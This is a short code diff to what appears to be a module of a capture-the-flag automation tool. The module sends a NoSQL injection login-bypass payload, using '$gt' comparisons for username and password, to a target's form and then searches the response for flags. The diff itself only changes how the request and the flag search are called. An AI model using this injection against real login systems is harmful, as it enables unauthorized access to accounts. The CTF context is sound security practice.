@@ -119,8 +119,8 @@ class Unit(web.WebUnit):
             last_location = self.target.upstream.decode("utf-8").rstrip("/") + "/"
 
         try:
-            r = self.session.request(
-                method.lower(),
+            r = method(
+                # method,
                 last_location + action,
                 json={"username": {"$gt": ""}, "password": {"$gt": ""},},
                 timeout=2,
@@ -128,7 +128,7 @@ class Unit(web.WebUnit):
             )
 
             # Hunt for flags if we have a successful injection!
-            katana.locate_flags(self, r.text)
+            self.manager.find_flag(self, r.text)
         except (
             requests.exceptions.ConnectionError,
             requests.exceptions.ChunkedEncodingError,
